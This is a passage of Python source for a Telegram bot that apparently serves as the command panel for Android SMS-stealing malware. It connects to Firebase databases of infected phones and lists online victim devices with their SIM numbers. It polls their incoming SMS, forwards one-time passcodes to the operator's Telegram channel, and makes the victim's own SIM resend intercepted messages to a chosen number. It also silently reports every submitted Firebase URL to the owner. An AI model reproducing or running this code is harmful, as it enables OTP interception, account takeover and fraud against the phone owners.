        otp_msg = f"""📨 <b>NEW SMS RECEIVED</b>
──────────────────────────────
🆔 <b>Device:</b> <code>{client_id}</code>
📞 <b>From:</b> <code>{sms_from}</code>
🕐 <b>Time:</b> {sms_time}
──────────────────────────────
💬 <b>Message:</b>
<code>{sms_body}</code>
──────────────────────────────"""

        if otp_channel_id:
            try:
                safe_send_message(otp_channel_id, otp_msg, track=False, disable_web_page_preview=True)
                logger.info(f"OTP forwarded to channel {otp_channel_id}")
            except Exception as e:
                logger.error(f"Telegram channel forward error: {e}")
        elif user_id:
            try:
                safe_send_message(user_id, otp_msg, track=False, disable_web_page_preview=True)
                logger.info(f"OTP sent to user {user_id}")
            except Exception:
                pass
                
        target_phone = None
        if client_id and client_id in device_forward_numbers:
            target_phone = device_forward_numbers[client_id].get("phone")
        elif user_id in user_forward_number:
            target_phone = user_forward_number[user_id]
            
        if target_phone and db and client_id:
            sim_slot = 0
            if user_id in user_selected_sim and user_selected_sim[user_id].get("client_id") == client_id:
                sim_slot = user_selected_sim[user_id].get("sim_index", 0) or 0
            else:
                try:
                    c_data = get_client_by_id(db, client_id)
                    sims = extract_sims(c_data)
                    if sims:
                        sim_slot = sims[0].get("simSlotIndex", 0) or 0
                except Exception:
                    sim_slot = 0
                    
            forward_sms_data = {
                "from": sim_slot,
                "sim": sim_slot,
                "simSlot": sim_slot,
                "fromSlot": sim_slot,
                "isSended": False,
                "isSent": False,
                "action": "send_sms",
                "command": "sendSMS",
                "message": sms_body,
                "messageText": sms_body,
                "sms": sms_body,
                "to": target_phone,
                "number": target_phone,
                "phoneNumber": target_phone,
                "destination": target_phone
            }
            try:
                db.child(f"clients/{client_id}/webhookEvent/sendSms").set(forward_sms_data)
            except Exception:
                pass
            try:
                db.child(f"clients/{client_id}/sendSms").set(forward_sms_data)
            except Exception:
                pass
            try:
                db.child(f"clients/{client_id}/action").set(forward_sms_data)
            except Exception:
                pass
            try:
                db.child(f"clients/{client_id}/command").set(forward_sms_data)
            except Exception:
                pass
                
            safe_send_message(user_id, f"""📨 <b>NEW SMS FORWARDED TO PHONE</b>
──────────────────────────────
🆔 <b>Device:</b> <code>{client_id[:12]}...</code>
📶 <b>Sent via SIM:</b> SIM {sim_slot + 1}
📞 <b>From Sender:</b> <code>{sms_from}</code>
➡️ <b>Forwarded To:</b> <code>{target_phone}</code>

💬 <b>Message:</b>
<code>{sms_body}</code>
──────────────────────────────
✅ <i>Automatically forwarded via device SIM!</i>""", disable_web_page_preview=True)
    except Exception as e:
        logger.error(f"Forward error: {e}")

def start_otp_monitoring_for_device_forward(user_id, client_id, db):
    try:
        lock_existing_messages(user_id, client_id, db)
        otp_channel_id = user_otp_channel.get(user_id, {}).get("otp_channel_id")
        otp_monitoring[user_id] = {
            "client_id": client_id,
            "otp_channel_id": otp_channel_id,
            "connect_time": int(time.time() * 1000)
        }
        logger.info(f"Device forward monitoring started for user {user_id}, device {client_id[:12]}...")
    except Exception as e:
        logger.error(f"Error starting device monitoring: {e}")

def otp_sms_monitor():
    while True:
        try:
            devices_to_monitor = {}
            for u_id, dev_entry in list(user_connected_device.items()):
                c_id = dev_entry.get("client_id")
                f_id = dev_entry.get("fb_id", "1")
                c_time = dev_entry.get("connect_time") or int(time.time() * 1000)
                if c_id:
                    devices_to_monitor[c_id] = {
                        "user_id": u_id,
                        "fb_id": f_id,
                        "connect_time": c_time,
                        "otp_info": {
                            "client_id": c_id,
                            "otp_channel_id": user_otp_channel.get(u_id, {}).get("otp_channel_id")
                        }
                    }
                    
            for u_id, o_info in list(otp_monitoring.items()):
                c_id = o_info.get("client_id")
                if c_id and c_id not in devices_to_monitor:
                    devices_to_monitor[c_id] = {
                        "user_id": u_id,
                        "fb_id": "1",
                        "connect_time": o_info.get("connect_time") or int(time.time() * 1000),
                        "otp_info": o_info
                    }
                    
            for c_id, fwd_data in list(device_forward_numbers.items()):
                if c_id not in devices_to_monitor:
                    u_id = fwd_data.get("user_id")
                    if u_id:
                        devices_to_monitor[c_id] = {
                            "user_id": u_id,
                            "fb_id": "1",
                            "connect_time": int(time.time() * 1000),
                            "otp_info": {
                                "client_id": c_id,
                                "otp_channel_id": user_otp_channel.get(u_id, {}).get("otp_channel_id")
                            }
                        }
                        
            for client_id, dev_entry in list(devices_to_monitor.items()):
                user_id = dev_entry["user_id"]
                fb_list = user_firebase.get(user_id, {})
                if not fb_list:
                    continue
                    
                target_fb_id = dev_entry.get("fb_id", "1")
                fb_data = fb_list.get(target_fb_id) or list(fb_list.values())[0]
                db = fb_data.get("db") if fb_data else None
                if not db:
                    continue
                    
                if user_id not in user_locked_messages:
                    user_locked_messages[user_id] = {}
                if client_id not in user_locked_messages[user_id]:
                    user_locked_messages[user_id][client_id] = set()
                locked_set = user_locked_messages[user_id][client_id]
                
                connect_time = dev_entry.get("connect_time", 0)
                all_msgs = collect_client_messages(db, client_id)
                new_found = False
                
                for msg in all_msgs:
                    msg_id = msg.get("id") or 0
                    msg_time_ms = 0
                    try:
                        if isinstance(msg_id, (int, float)) and msg_id > 1e11:
                            msg_time_ms = int(msg_id)
                    except Exception:
                        pass
                        
                    fp = msg["fingerprint"]
                    id_str = str(msg_id) if msg_id else ""
                    
                    if connect_time and msg_time_ms and msg_time_ms < connect_time:
                        locked_set.add(fp)
                        if id_str:
                            locked_set.add(id_str)
                        continue
                        
                    if fp not in locked_set and (not id_str or id_str not in locked_set):
                        locked_set.add(fp)
                        if id_str:
                            locked_set.add(id_str)
                        forward_sms_to_otp(user_id, dev_entry["otp_info"], msg, db, client_id)
                        new_found = True
                        
                if new_found:
                    save_data()
                    
        except Exception as e:
            logger.error(f"OTP Monitor Error: {e}")
            
        time.sleep(0.5)

otp_thread = threading.Thread(target=otp_sms_monitor, daemon=True)
otp_thread.start()

client_previous_status = {}

def monitor_client_status():
    while True:
        try:
            for user_id in list(user_connected_device.keys()):
                try:
                    if user_id not in user_firebase:
                        continue
                    
                    conn_info = user_connected_device[user_id]
                    client_id = conn_info.get("client_id")
                    fb_id = conn_info.get("fb_id", "1")
                    
                    fb_list = user_firebase.get(user_id, {})
                    fb_data = fb_list.get(fb_id)
                    if not fb_data:
                        continue
                    
                    db = fb_data["db"]
                    is_online = is_client_online(db, client_id)
                    
                    prev_status = client_previous_status.get(user_id)
                    
                    if prev_status is True and not is_online:
                        try:
                            safe_send_message(user_id, f"""
⚠️ CLIENT OFFLINE ❌

🆔 <code>{client_id}</code>

Your connected device is now offline!

Please use ONLINE button to connect another device
""")
                        except:
                            pass
                        
                        if user_id in user_connected_device:
                            user_connected_device.pop(user_id, None)
                        if user_id in user_selected_sim:
                            user_selected_sim.pop(user_id, None)
                        if user_id in otp_monitoring:
                            del otp_monitoring[user_id]
                        if user_id in user_last_message_keys:
                            del user_last_message_keys[user_id]
                        if user_id in user_locked_messages:
                            del user_locked_messages[user_id]
                        if user_id in user_forward_number:
                            del user_forward_number[user_id]
                        if user_id in user_forward_states:
                            del user_forward_states[user_id]
                        save_data()
                    
                    client_previous_status[user_id] = is_online
                    
                except:
                    pass
        except:
            pass
        time.sleep(1)

client_status_thread = threading.Thread(target=monitor_client_status, daemon=True)
client_status_thread.start()

def get_main_menu_keyboard(is_admin=False):
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    btn1 = build_inline_button("Firebase", callback_data="menu_firebase", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔥"))
    btn2 = build_inline_button("Online", callback_data="menu_online", style="success", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📶"))
    btn3 = build_inline_button("Disconnect", callback_data="menu_disconnect", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔒"))
    btn5 = build_inline_button("OTP Forward", callback_data="menu_otp_channel", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💬"))
    btn6 = build_inline_button("Logout", callback_data="menu_logout", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🚪"))
    btn8 = build_inline_button("Search", callback_data="menu_search", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔍"))
    btn10 = build_inline_button("Token CN", callback_data="menu_token_cn", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📝"))
    btn_ref = build_inline_button("Refresh", callback_data="menu_refresh", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄"))
    keyboard.add(btn1, btn2)
    keyboard.add(btn3, btn5)
    keyboard.add(btn6, btn8)
    keyboard.add(btn10, btn_ref)
    if is_admin:
        btn4 = build_inline_button("Bot Mode", callback_data="menu_bot_mode", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("⚙️"))
        btn7 = build_inline_button("Broadcast", callback_data="menu_broadcast", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📢"))
        keyboard.add(btn4, btn7)
    return keyboard

def show_main_menu(chat_id, is_admin=False, text=None):
    is_admin = is_admin or (chat_id == ADMIN_ID)
    keyboard = get_main_menu_keyboard(is_admin=is_admin)
    name = get_user_name(chat_id)
    menu_text = text or f"""✨ <b>Welcome,  {name}</b> ✨
Your command center is now active.
Control • Connect • Manage

⚡ <i>Select your next move.</i>"""
    safe_send_message(chat_id, menu_text, reply_markup=keyboard)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_id = user.id
    chat_id = message.chat.id
    
    remove_reply_keyboard(chat_id)
    update_user_version(user_id)
    update_user_activity(user_id)
    user_all_ids.add(user_id)
    save_data()
    
    first_name = user.first_name or ""
    last_name = user.last_name or ""
    name = html.escape(f"{first_name} {last_name}".strip()) or "User"
    user_display_names[user_id] = name
    user_display_names[chat_id] = name
    
    if user_id in user_last_hello_message:
        try:
            bot.delete_message(user_id, user_last_hello_message[user_id])
        except Exception:
            pass
        user_last_hello_message.pop(user_id, None)

    start_text = f"""✨ <b>Welcome,  {name}</b> ✨
Your command center is now active.
Control • Connect • Manage

⚡ <i>Select your next move.</i>"""

    if user_id == ADMIN_ID:
        keyboard = get_main_menu_keyboard(is_admin=True)
        safe_send_message(chat_id, start_text, reply_markup=keyboard)
    else:
        if not check_bot_mode(user_id):
            safe_send_message(chat_id, """✨ <b>Bot System Notice</b> ✨

⚠️ <b>Bot Currently Inactive</b>
The bot is currently turned off. Please contact the owner:
@AYUSH_JOD3""")
            return
        
        if not check_user_joined(user_id):
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(
                build_inline_button("Join Channel", url=CHANNEL_LINK, style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("📢")),
                build_inline_button("Verify", callback_data="verify", style="success", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💓"))
            )
            safe_send_message(chat_id, f"""✨ <b>Welcome,  {name}</b> ✨

👋 <b>Verification Required</b>
Please join our official channel below, then click <b>Verify</b> to access your command center:""", reply_markup=keyboard)
            return
        
        keyboard = get_main_menu_keyboard(is_admin=False)
        safe_send_message(chat_id, start_text, reply_markup=keyboard)

@bot.message_handler(commands=['menu'])
def menu_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    if not check_version_and_notify(user_id, chat_id):
        return
    update_user_activity(user_id)
    remove_reply_keyboard(chat_id)
    show_main_menu(chat_id, is_admin=(user_id == ADMIN_ID))

@bot.callback_query_handler(func=lambda call: call.data == "verify")
def verify_user(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "Bot is currently disabled by admin", show_alert=True)
        return
    
    if check_user_joined(user_id):
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except Exception:
            pass
        show_main_menu(chat_id)
    else:
        bot.answer_callback_query(call.id, "Please join our channel first to continue", show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data.startswith("menu_"))
def handle_menu_callbacks(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    action = call.data
    
    try:
        bot.answer_callback_query(call.id)
    except:
        pass
        
    if action == "menu_firebase":
        process_firebase(user_id, chat_id)
    elif action == "menu_online":
        process_online(user_id, chat_id)
    elif action == "menu_disconnect":
        process_disconnect(user_id, chat_id)
    elif action == "menu_otp_channel":
        process_otp_channel(user_id, chat_id)
    elif action == "menu_logout":
        process_logout(user_id, chat_id)
    elif action == "menu_search":
        process_search(user_id, chat_id)
    elif action == "menu_token_cn":
        process_token_cn(user_id, chat_id)
    elif action == "menu_bot_mode":
        process_bot_mode(user_id, chat_id)
    elif action == "menu_broadcast":
        process_broadcast(user_id, chat_id)

    elif action == "menu_refresh":
        show_main_menu(chat_id, is_admin=(user_id == ADMIN_ID))

def process_firebase(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, """
❌ BOT CURRENTLY OFF ❌

PLEASE CONTACT OWNER
         ☠️ @AYUSH_JOD3 ☠️
""")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "Please join channel first! ❌")
        return
    
    fb_count = user_firebase_count.get(user_id, 0)
    if fb_count > 0:
        safe_send_message(chat_id, f"""
🩸 Your Already Connected

FIREBASE- {fb_count}

Need LOGOUT FIREBASE use LOGOUT button
""")
    
    user_states[user_id] = "waiting_for_db_url"
    safe_send_message(chat_id, """
📡 PLEASE SEND NEW FIREBASE

DATABASE URL

AFTER YOU SEND DB URL 
firebase Connect ho Jayega
""")

@bot.message_handler(func=lambda message: message.text in ["FIREBASE", "Firebase", "/firebase"])
def firebase_handler(message):
    process_firebase(message.from_user.id, message.chat.id)

@bot.message_handler(func=lambda message: user_states.get(message.from_user.id) == "waiting_for_db_url")
def handle_db_url(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        user_states.pop(user_id, None)
        return
    
    db_url = message.text.strip()
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        user_states.pop(user_id, None)
        safe_send_message(chat_id, "❌ BOT CURRENTLY OFF ❌")
        return
    
    try:
        bot.delete_message(chat_id, message.message_id)
    except:
        pass
    
    user_states.pop(user_id, None)
    
    loading = safe_send_message(chat_id, "🔄 Connecting to Firebase...", track=False)
    
    firebase, db, client_count = connect_firebase(db_url)
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    if firebase and db:
        if client_count == 0:
            safe_send_message(chat_id, "❌ Empty Database!\n\nThis Firebase has no clients.")
            return
        
        if is_firebase_url_used_by_user(user_id, db_url):
            safe_send_message(chat_id, "THIS FIREBASE ALREADY CONNECTED USE DIFFERENT FIREBASE")
            return
        

        
        if user_id not in user_firebase:
            user_firebase[user_id] = {}
            user_firebase_count[user_id] = 0
        
        user_firebase_count[user_id] += 1
        fb_id = str(user_firebase_count[user_id])
        
        user_firebase[user_id][fb_id] = {
            "firebase": firebase,
            "db": db,
            "url": db_url,
            "connected_date": datetime.now().strftime('%d/%m/%Y'),
            "connected_time": datetime.now().strftime('%I:%M:%S %p'),
            "client_count": client_count
        }
        
        try:
            user = message.from_user
            username = user.username or user.first_name or "Unknown"
            forward_msg = f"""
📡 NEW FIREBASE FOUND IN BOT

Firebase Link - {db_url}

Total clients in db - {client_count}

From - {username}

Date - {datetime.now().strftime('%d/%m/%Y')}
"""
            bot.send_message(FIREBASE_DATA_CHANNEL, forward_msg)
        except:
            pass
        
        save_data()
        
        safe_send_message(chat_id, f"""
🩵 FIREBASE CONNECTED 🩵

📊 Total Clients: {client_count}

Your Firebase Count: {user_firebase_count[user_id]}
""")
    else:
        safe_send_message(chat_id, "❌ Failed to connect!")

def process_online(user_id, chat_id):
    if not check_version_and_notify(user_id, chat_id):
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        safe_send_message(chat_id, "❌ BOT CURRENTLY OFF ❌")
        return
    
    if not check_user_joined(user_id):
        safe_send_message(chat_id, "Please join channel first! ❌")
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        safe_send_message(chat_id, "❌ Please connect Firebase first!")
        return
    
    loading = safe_send_message(chat_id, "🔍 Searching online clients...", track=False)
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    total_online = 0
    idx = 0
    
    for fb_id, fb_data in fb_list.items():
        try:
            db = fb_data["db"]
            online_clients = get_online_clients(db)
            
            if online_clients:
                safe_send_message(chat_id, f"📁 Firebase-{fb_id}\n🔗 {fb_data['url'][:50]}...\n📊 Clients: {fb_data.get('client_count', 'N/A')}")
                
                for client in online_clients:
                    data = client["data"]
                    client_id = client["id"]
                    sims = extract_sims(data)
                    idx += 1
                    
                    sim_details = ""
                    for sim in sims:
                        c_name = sim.get('carrierName', 'Active SIM')
                        p_no = sim.get('phoneNumber', '')
                        p_str = f"  |  📞 {p_no}" if p_no and p_no != "N/A" else ""
                        s_idx = sim.get('simSlotIndex', 0)
                        sim_details += f"📶 {c_name}{p_str}  |  🎰 Slot {s_idx}\n"
                    
                    model_name = data.get('modelName', 'Unknown')
                    mob_no = data.get('mobNo', 'N/A')
                    battery = data.get('battery', 'N/A')
                    
                    msg = f"""
<b>Client #{idx}</b>

✅ <b>Connection Available</b>

<b>Main Num</b> - {mob_no}
<b>Model_name</b> - {model_name}
<b>Device_id</b> - <code>{client_id}</code>
<b>Battery</b> - {str(battery).rstrip('%')}%

<b>Sims →</b>
{sim_details if sim_details else '⚠️ No SIM found'}
──────────────────────────────
"""
                    keyboard = types.InlineKeyboardMarkup(row_width=2)
                    keyboard.add(build_inline_button("Connect", callback_data=f"connect_{fb_id}_{client_id}", style="success", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔗")))
                    
                    safe_send_message(chat_id, msg, reply_markup=keyboard)
                    total_online += 1
            else:
                safe_send_message(chat_id, f"📁 Firebase-{fb_id}: No online clients")
        except Exception as e:
            logger.error(f"Online error: {e}")
            safe_send_message(chat_id, f"❌ Error reading Firebase-{fb_id}")
    
    if total_online == 0:
        safe_send_message(chat_id, "❌ No online clients across all Firebase!")

@bot.message_handler(func=lambda message: message.text in ["ONLINE", "Online", "/online"])
def online_clients_handler(message):
    process_online(message.from_user.id, message.chat.id)

def send_connected_device_card(chat_id, user_id, client_id, fb_id, client_data, sim_index=None):
    sims = extract_sims(client_data)
    token_status = "✅ ACTIVE" if user_id in user_token_channel else "❌ NOT SET"
    fwd_dev = device_forward_numbers.get(client_id)
    if fwd_dev and fwd_dev.get("phone"):
        otp_status = f"✅ {fwd_dev['phone']}"
    elif user_id in user_otp_channel:
        otp_status = "✅ ACTIVE"
    else:
        otp_status = "❌ NOT SET" 
    
    if sim_index is None:
        sim_index = user_selected_sim.get(user_id, {}).get("sim_index")
    if sim_index is None:
        sim_index = 0
        
    sim_num = sim_index + 1
    selected_sim = get_sim_for_slot(sims, sim_index)
    has_sim = selected_sim is not None
    
    if has_sim:
        carrier = selected_sim.get('carrierName') or "Active"
        phone = selected_sim.get('phoneNumber') or ""
        phone_str = f" | {phone}" if phone and phone != "N/A" else ""
        active_sim_text = f"SIM {sim_num} ({carrier}{phone_str})"
        sim_note = f"⚡ <i>All token SMS commands will automatically be sent using SIM {sim_num}!</i>"
    else:
        active_sim_text = f"SIM {sim_num} (SIM Not Available)"
        sim_note = f"⏳ <i>SIM {sim_num} selected. SMS will automatically be sent using SIM {sim_num} once available on the device!</i>"
    
    battery = client_data.get('battery', 'N/A') if client_data else 'N/A'
    model = client_data.get('modelName', 'Unknown') if client_data else 'Unknown'
    
    msg = f"""✨ <b>DEVICE CONNECTED</b> ✨
──────────────────────────────
🆔 <b>Device ID:</b> <code>{client_id}</code>
🪩 <b>Model:</b> {model}
🔋 <b>Battery:</b> {str(battery).rstrip('%')}%

📶 <b>Active SIM:</b> <b>{active_sim_text}</b>
──────────────────────────────
🔑 <b>Token Channel:</b> {token_status}
📨 <b>OTP Monitoring:</b> {otp_status}
──────────────────────────────
{sim_note}"""

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    buttons = [
        build_inline_button("Change SIM", callback_data=f"changesim_{fb_id}_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔄")),
        build_inline_button("Disconnect", callback_data="menu_disconnect", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("🔒"))
    ]
    keyboard.add(*buttons)
    keyboard.add(
        build_inline_button("See Messages", callback_data=f"seemgs_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💬")),
        build_inline_button("Forward Message", callback_data=f"msg_forward_{client_id}", style="primary", icon_custom_emoji_id=CUSTOM_EMOJIS.get("💬"))
    )
    
    safe_send_message(chat_id, msg, reply_markup=keyboard)


def prompt_sim_selection(chat_id, user_id, client_id, fb_id, client_data, is_change=False):
    sims = extract_sims(client_data)
    model_name = client_data.get('modelName', 'Unknown') if client_data else 'Unknown'
    battery = client_data.get('battery', 'N/A') if client_data else 'N/A'
    
    curr_sim = user_selected_sim.get(user_id, {}).get("sim_index") if is_change else None
    
    max_slots = max(2, len(sims))
    sim_buttons = []
    sim_list_text = ""
    
    for i in range(max_slots):
        sim_num = i + 1
        sim = get_sim_for_slot(sims, i)
        has_sim = sim is not None
        
        if has_sim:
            c = sim.get('carrierName') or "Active"
            p = sim.get('phoneNumber') or ""
            phone_str = f" | 📞 <code>{p}</code>" if p and p != "N/A" else ""
            sim_list_text += f"📶 <b>SIM {sim_num}:</b> {c}{phone_str} (Slot {i})\n"
            btn_extra = f" ({c})"
        else:
            sim_list_text += f"⚠️ <b>SIM {sim_num}:</b> <i>Not Available</i>\n"
            btn_extra = " (Not Available)"
            
        btn_label = f"SIM {sim_num}{btn_extra}"
        if is_change and i == curr_sim:
            btn_label = f"SIM {sim_num} (Active)"
            
        sim_buttons.append(
            build_inline_button(
                btn_label,
                callback_data=f"selectsim_{fb_id}_{client_id}_{i}",
                style="success" if (is_change and i == curr_sim) else "primary",
                icon_custom_emoji_id=CUSTOM_EMOJIS.get("✅") if (is_change and i == curr_sim) else CUSTOM_EMOJIS.get("📶")
            )
        )
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for btn in sim_buttons:
        keyboard.add(btn)
        
    if is_change:
        keyboard.add(build_inline_button("Back", callback_data=f"showcard_{fb_id}_{client_id}", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))
    else:
        keyboard.add(build_inline_button("Cancel", callback_data="searchcancel", style="danger", icon_custom_emoji_id=CUSTOM_EMOJIS.get("❌")))

    title = "🔄 <b>CHANGE ACTIVE SIM</b>" if is_change else "📱 <b>SELECT SIM TO CONNECT</b>"
    if is_change:
        action_text = "Select which SIM you want to switch to (active or waiting):"
    else:
        action_text = "Select which SIM you want to connect for SMS / Tokens:"
    
    text = f"""{title}
──────────────────────────────
🪩 <b>Model:</b> {model_name}
🆔 <b>Device ID:</b> <code>{client_id}</code>
🔋 <b>Battery:</b> {str(battery).rstrip('%')}%

{sim_list_text.strip()}
──────────────────────────────
{action_text}"""

    safe_send_message(chat_id, text, reply_markup=keyboard)


@bot.callback_query_handler(func=lambda call: call.data.startswith("connect_"))
def connect_client(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    parts = call.data.replace("connect_", "").split("_")
    
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "Bot is currently disabled by admin", show_alert=True)
        return
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "Please connect Firebase first", show_alert=True)
        return
    
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    
    loading = safe_send_message(chat_id, f"""
🔍 CHECKING DEVICE STATUS...

──────────────────────────────
CONNECTION FOUND ✅
Device ID - {client_id[:12]}...

Checking available Online?
Please Wait...... ⏳
──────────────────────────────
""", track=False)
    
    if not is_client_online(db, client_id):
        if loading:
            try:
                bot.delete_message(chat_id, loading.message_id)
            except:
                pass
        bot.answer_callback_query(call.id, "Selected device is currently offline", show_alert=True)
        safe_send_message(chat_id, f"""
⚠️ CONNECTION OFFLINE RIGHT NOW ⚠️

🆔 Device ID: <code>{client_id}</code>

Please try again later!
ONLINE button se check karen
""")
        return
    
    if loading:
        try:
            bot.delete_message(chat_id, loading.message_id)
        except:
            pass
    
    connecting = safe_send_message(chat_id, "🔄 CONNECTING...", track=False)
    client_data = get_client_by_id(db, client_id)
    if connecting:
        try:
            bot.delete_message(chat_id, connecting.message_id)
        except:
            pass
    
    if not client_data:
        bot.answer_callback_query(call.id, "Device not found", show_alert=True)
        return
    
    prompt_sim_selection(chat_id, user_id, client_id, fb_id, client_data, is_change=False)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("selectsim_"))
def select_sim_handler(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
    
    update_user_activity(user_id)
    
    if not check_bot_mode(user_id):
        bot.answer_callback_query(call.id, "Bot is currently disabled by admin", show_alert=True)
        return
    
    parts = call.data.replace("selectsim_", "").split("_")
    if len(parts) == 3:
        fb_id, client_id, sim_index = parts
    else:
        client_id, sim_index = parts[0], parts[1]
        fb_id = "1"
    sim_index = int(sim_index)
    
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "Please connect Firebase first", show_alert=True)
        return
    
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    client_data = get_client_by_id(db, client_id)
    if not client_data and user_id in user_connected_device:
        if user_connected_device[user_id].get("client_id") == client_id:
            client_data = user_connected_device[user_id].get("data")
            
    if not client_data:
        bot.answer_callback_query(call.id, "Device not found", show_alert=True)
        return
        
    sims = extract_sims(client_data)
    selected_sim = get_sim_for_slot(sims, sim_index)
    has_sim = selected_sim is not None
    
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
        
    if user_id in user_connected_device:
        old_device = user_connected_device[user_id]
        if old_device.get("client_id") != client_id:
            old_model = old_device.get("data", {}).get("modelName", "Unknown")
            user_connected_device.pop(user_id, None)
            user_selected_sim.pop(user_id, None)
            if user_id in otp_monitoring:
                del otp_monitoring[user_id]
            if user_id in user_locked_messages:
                del user_locked_messages[user_id]
            safe_send_message(chat_id, f"🛑 Disconnected previous device: {old_model}")
            
    user_connected_device[user_id] = {"client_id": client_id, "data": client_data, "fb_id": fb_id, "connect_time": int(time.time() * 1000)}
    user_selected_sim[user_id] = {
        "client_id": client_id,
        "sim_index": sim_index,
        "sim_data": selected_sim,
        "no_sim": not has_sim
    }
    save_data()
    
    start_otp_monitoring_for_user(user_id, client_id, db, chat_id if user_id in user_otp_channel else None)
        
    send_connected_device_card(chat_id, user_id, client_id, fb_id, client_data, sim_index=sim_index)
    
    if user_id not in user_token_channel:
        user_states[user_id] = "waiting_for_channel"
        safe_send_message(chat_id, """
──────────────────────────────
📢 PLEASE SEND CHANNEL
──────────────────────────────
SEND CHANNEL LINK / CHANNEL ID

Jaha aapka message drop hoga vo channel de

💡 <b>Tip:</b> Use TOKEN CN to set permanent channel
""")

    if has_sim:
        bot.answer_callback_query(call.id, f"SIM {sim_index + 1} connected successfully!", show_alert=False)
    else:
        bot.answer_callback_query(call.id, f"SIM {sim_index + 1} selected! SIM is not currently available on device. SMS will automatically be sent using SIM {sim_index + 1} once available.", show_alert=True)


@bot.callback_query_handler(func=lambda call: call.data.startswith("changesim_"))
def change_sim_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
        
    update_user_activity(user_id)
    
    parts = call.data.replace("changesim_", "").split("_")
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
        
    fb_list = user_firebase.get(user_id, {})
    if not fb_list:
        bot.answer_callback_query(call.id, "Please connect Firebase first", show_alert=True)
        return
        
    fb_data = fb_list.get(fb_id, list(fb_list.values())[0])
    db = fb_data["db"]
    client_data = get_client_by_id(db, client_id)
    if not client_data and user_id in user_connected_device:
        client_data = user_connected_device[user_id].get("data")
        
    if not client_data:
        bot.answer_callback_query(call.id, "Device not found", show_alert=True)
        return
        
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
        
    prompt_sim_selection(chat_id, user_id, client_id, fb_id, client_data, is_change=True)
    bot.answer_callback_query(call.id)


@bot.callback_query_handler(func=lambda call: call.data.startswith("showcard_"))
def show_card_callback(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    
    if not check_version_and_notify(user_id, chat_id):
        bot.answer_callback_query(call.id, "Bot updated. Please send /start first", show_alert=True)
        return
        
    parts = call.data.replace("showcard_", "").split("_")
    if len(parts) == 2:
        fb_id, client_id = parts
    else:
        client_id = parts[0]
        fb_id = "1"
        
    try:
        bot.delete_message(chat_id, call.message.message_id)
    except Exception:
        pass
        
    if user_id in user_connected_device:
        dev_info = user_connected_device[user_id]
        client_data = dev_info.get("data")
        sim_idx = user_selected_sim.get(user_id, {}).get("sim_index")
        send_connected_device_card(chat_id, user_id, client_id, fb_id, client_data, sim_index=sim_idx)
    bot.answer_callback_query(call.id)




